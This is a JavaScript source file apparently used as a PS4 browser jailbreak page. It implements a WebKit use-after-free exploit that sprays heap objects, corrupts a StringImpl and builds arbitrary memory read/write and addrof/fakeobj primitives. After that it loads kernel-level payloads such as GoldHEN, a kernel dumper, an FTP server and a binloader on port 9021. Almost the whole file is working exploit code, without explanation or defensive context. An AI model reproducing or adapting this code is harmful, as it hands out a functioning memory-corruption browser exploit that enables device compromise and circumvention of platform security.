const OFFSET_ELEMENT_REFCOUNT = 0x10;
const OFFSET_JSAB_VIEW_VECTOR = 0x10;
const OFFSET_JSAB_VIEW_LENGTH = 0x18;
const OFFSET_LENGTH_STRINGIMPL = 0x04;
const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;
const LENGTH_ARRAYBUFFER = 0x8;
const LENGTH_STRINGIMPL = 0x14;
const LENGTH_JSVIEW = 0x20;
const LENGTH_VALIDATION_MESSAGE = 0x30;
const LENGTH_TIMER = 0x48;
const LENGTH_HTMLTEXTAREA = 0xd8;
const SPRAY_ELEM_SIZE = 0x6000;
const SPRAY_STRINGIMPL = 0x1000;
const NB_FRAMES = 0xfa0;
const NB_REUSE = 0x8000;
var g_arr_ab_1 = [];
var g_arr_ab_2 = [];
var g_arr_ab_3 = [];
var g_frames = [];
var g_relative_read = null;
var g_relative_rw = null;
var g_ab_slave = null;
var g_ab_index = null;
var g_timer_leak = null;
var g_jsview_leak = null;
var g_jsview_butterfly = null;
var g_message_heading_leak = null;
var g_message_body_leak = null;
var g_textarea_div_elem = null;
var g_obj_str = {};
var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
var g_round = 1;
var g_input = null;
var guess_htmltextarea_addr = new Int64("0x2031b00d8");
function setupRW() {
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length > 0xff) {
			g_relative_rw = g_arr_ab_3[i];
			debug_log("-> Succesfully got a relative R/W");
			break;
		}
	}
	if (g_relative_rw === null)
		die("[!] Failed to setup a relative R/W primitive");
	debug_log("-> Setting up arbitrary R/W");
	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
	let ab_index = g_jsview_leak.sub(ab_addr).low32();
	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
		g_ab_index = ab_index + LENGTH_JSVIEW;
	else
		g_ab_index = ab_index - LENGTH_JSVIEW;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length === 0x41) {
			g_ab_slave = g_arr_ab_3[i];
			g_arr_ab_3 = null;
			break;
		}
	}
	if (g_ab_slave === null)
		die("[!] Didn't found the slave JSArrayBufferView");
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
	debug_log("-> Testing arbitrary R/W");
	let saved_vtable = read64(guess_htmltextarea_addr);
	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
		die("[!] Failed to setup arbitrary R/W primitive");
	debug_log("-> Succesfully got arbitrary R/W!");
	write64(guess_htmltextarea_addr, saved_vtable);
	cleanup();
	g_ab_slave.leakme = 0x1337;
	var bf = 0;
	for(var i = 15; i >= 8; i--)
		bf = 256 * bf + g_relative_rw[g_ab_index + i];
	g_jsview_butterfly = new Int64(bf);
	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
		die("[!] Failed to setup addrof/fakeobj primitives");
	debug_log("->Exploit Complete..Run Jailbreak !!");
	if(window.postExploit)
		window.postExploit();
}
function toggle_payload(pld){
	if(pld == "goldhen1"){
		document.getElementById("progress").innerHTML="Loading GoldHenv1.0.. Please wait..";
	if(fw=="755"){
			preloadScripts(['jb.js', 'preloader.js', 'goldhen1v'+fw+'.js', 'loader.js']);
	}else{
			preloadScripts(['preloader'+fw+'.js', 'goldhen1v'+fw+'.js', 'loader.js']);	
		}
	}else if(pld == "goldhen"){
		document.getElementById("progress").innerHTML="Loading GoldHenv1.1.. Please wait..";
	if(fw=="755"){
			preloadScripts(['jb.js', 'preloader.js', 'goldhen'+fw+'.js', 'loader.js']);
	}else{
			preloadScripts(['preloader'+fw+'.js', 'goldhen'+fw+'.js', 'loader.js']);	
		}
	}else if(pld == "hen213b"){
		document.getElementById("progress").innerHTML="Loading Hen v2.1.3b ... Please wait..";
		preloadScripts(['jb.js', 'preloaderx.js', 'hen213b.js', 'loader.js']);
	}else if(pld == "backup"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'backup.js', 'loader.js']);
	}else if(pld == "restore"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'restore.js', 'loader.js']);
	}else if(pld == "dumper"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['jb.js', 'preloader.js', 'kerneldumper.js', 'loader.js']);
	}else if(pld == "app2usb"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['jb.js', 'preloader.js', 'app2usb.js', 'loader.js']);
	}else if(pld == "ftp"){
		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Loaded.. Access at port 1337.."; }, 7000);
		preloadScripts(['jb.js', 'preloader.js', 'ftp.js', 'loader.js']);
	}else if(pld == "web"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'payload.js', 'loader.js', 'frontend.js']);
	}else if(pld == "todex"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'todex.js', 'loader.js']);
	}else if(pld == "binloader"){
		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9021..";
		preloadScripts(['jb.js', 'preloader.js', 'loader.js']);
	}else if(pld == "kernelclock"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'kernelclock.js', 'loader.js']);
	}else if(pld == "idu"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'idu.js', 'loader.js']);
	}else if(pld == "rifrenamer"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'rifrenamer.js', 'loader.js']);
	}else if(pld == "linux1gb"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'linux1G.js', 'loader.js']);
	}else if(pld == "linux3gb"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'linux3G.js', 'loader.js']);
	}else if(pld == "Toolbox"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'Toolbox.js', 'loader.js']);
	}else if(pld == "historyblocker"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'historyblocker.js', 'loader.js']);
	}else if(pld == "disableupdates"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'disableupdates.js', 'loader.js']);
	}else if(pld == "enableupdates"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'enableupdates.js', 'loader.js']);
	}else if(pld == "webrte"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'webrte.js', 'loader.js']);
	}else if(pld == "gtava1"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'gtava1.js', 'loader.js']);
	}else if(pld == "gtava2"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'gtava2.js', 'loader.js']);
	}else if(pld == "gtava3"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'gtava3.js', 'loader.js']);
	}else if(pld == "gtavl"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'gtavl.js', 'loader.js']);
	}else if(pld == "fan"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'fanThreshold.js', 'loader.js']);
		localStorage.setItem('fanthreshold', tempC.value);
	}else if(pld == "rd2113"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'Oysters113.js', 'loader.js']);
	}else if(pld == "rd2119"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'Oysters119.js', 'loader.js']);
	}else if(pld == "rd2124"){
		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
		preloadScripts(['preloader.js', 'Oysters124.js', 'loader.js']);
	}
	if(window.postPayload)
		window.postPayload();
	payload_finished(pld);
}
function payload_finished(payload)
{
	if(payload == "binloader"){
		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021"; }, 7000);
	} else if(payload != "exploit" && payload != "exploit_old"){
		setTimeout(function(){document.getElementById("progress").innerHTML="Payload Loaded Succesfully !!"; }, 7000);
	}
}
function read(addr, length) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	let arr = [];
	for (let i = 0; i < length; i++)
		arr.push(g_ab_slave[i]);
	return arr;
}
function read64(addr) {
	return new Int64(read(addr, 8));
}
function write(addr, data) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	for (let i = 0; i < data.length; i++)
		g_ab_slave[i] = data[i];
}
function write64(addr, data) {
	write(addr, data.bytes());
}
function addrof(obj) {
	g_ab_slave.leakme = obj;
	return read64(g_jsview_butterfly.sub(16));
}
function fakeobj(addr) {
	write64(g_jsview_butterfly.sub(16), addr);
	return g_ab_slave.leakme;
}
function cleanup() {
	select1.remove();
	select1 = null;
	input1.remove();
	input1 = null;
	input2.remove();
	input2 = null;
	input3.remove();
	input3 = null;
	div1.remove();
	div1 = null;
	g_input = null;
	g_rows1 = null;
	g_rows2 = null;
	g_frames = null;
}
function confuseTargetObjRound2() {
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");
	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
	setTimeout(setupRW, 6000);
}
function leakJSC() {
	debug_log("-> Looking for the smashed StringImpl...");
	var arr_str = Object.getOwnPropertyNames(g_obj_str);
	for (let i = arr_str.length - 1; i > 0; i--) {
		if (arr_str[i].length > 0xff) {
			debug_log("-> StringImpl corrupted successfully");
			g_relative_read = arr_str[i];
			g_obj_str = null;
			break;
		}
	}
	if (g_relative_read === null)
		die("[!] Failed to setup a relative read primitive");
	debug_log("-> Got a relative read");
        var tmp_spray = {};
        for(var i = 0; i < 100000; i++)
                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
	let tmp = [];
	for (let i = 0; i < 0x10000; i++) {
		if (i >= 0xfc00)
			g_arr_ab_3.push(new Uint8Array(ab));
		else
			tmp.push(new Uint8Array(ab));
	}
	tmp = null;
	var props = [];
	for (var i = 0; i < 0x400; i++) {
		props.push({ value: 0x42424242 });
		props.push({ value: g_arr_ab_3[i] });
	}
	while (g_jsview_leak === null) {
		Object.defineProperties({}, props);
		for (let i = 0; i < 0x800000; i++) {
			var v = undefined;
			if (g_relative_read.charCodeAt(i) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x01) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x02) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x03) === 0x42) {
				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x13) === 0x42)
					v = new Int64(str2array(g_relative_read, 8, i + 8));
			}
			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
				g_jsview_leak = v;
				props = null;
				break;
			}
		}
	}
	debug_log("-> JSArrayBufferView: " + g_jsview_leak);
	prepareUAF();
}
function confuseTargetObjRound1() {
	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");
	dumpTargetObj();
	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
	setTimeout(function(){leakJSC();}, 6000);
}
function handle2() {
	input2.focus();
}
function reuseTargetObj() {
	document.body.appendChild(g_input);
	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
		g_frames[i].setAttribute("rows", ',');
	for (let i = 0; i < NB_REUSE; i++) {
		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
		let view = new Float64Array(ab);
		view[0] = guess_htmltextarea_addr.asDouble();   
		view[3] = guess_htmltextarea_addr.asDouble();   
		g_arr_ab_1.push(view);
	}
	if (g_round == 1) {
		sprayStringImpl(0, SPRAY_STRINGIMPL);
		g_frames = [];
		g_round += 1;
		g_input = input3;
		setTimeout(confuseTargetObjRound1, 10);
	} else {
		setTimeout(confuseTargetObjRound2, 10);
	}
}
function dumpTargetObj() {
	debug_log("-> m_timer: " + g_timer_leak);
	debug_log("-> m_messageHeading: " + g_message_heading_leak);
	debug_log("-> m_messageBody: " + g_message_body_leak);
}
function findTargetObj() {
	for (let i = 0; i < g_arr_ab_1.length; i++) {
		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
			debug_log("-> Found fake ValidationMessage");
			if (g_round === 2) {
				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
				g_round++;
			}
			g_fake_validation_message = g_arr_ab_1[i];
			g_arr_ab_1 = [];
			return true;
		}
	}
	return false;
}
function prepareUAF() {
	g_input.setCustomValidity("ps4");
	for (let i = 0; i < NB_FRAMES; i++) {
		var element = document.createElement("frameset");
		g_frames.push(element);
	}
	g_input.reportValidity();
	var div = document.createElement("div");
	document.body.appendChild(div);
	div.appendChild(g_input);
	for (let i = 0; i < NB_FRAMES / 2; i++)
		g_frames[i].setAttribute("rows", g_rows1);
	g_input.reportValidity();
	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
		g_frames[i].setAttribute("rows", g_rows2);
	g_input.setAttribute("onfocus", "reuseTargetObj()");
	g_input.autofocus = true;
}
function sprayHTMLTextArea() {
	debug_log("-> Spraying HTMLTextareaElement ...");
	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
	document.body.appendChild(textarea_div_elem);
	textarea_div_elem.id = "div1";
	var element = document.createElement("textarea");
	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';
	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
		textarea_div_elem.appendChild(element.cloneNode());
}
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
		g_obj_str[s] = 0x1337;
	}
}
function go() {
		if(localStorage.is755Cached){
		sprayHTMLTextArea();
		if(window.midExploit)
			window.midExploit();
		g_input = input1;
		prepareUAF();
	}
}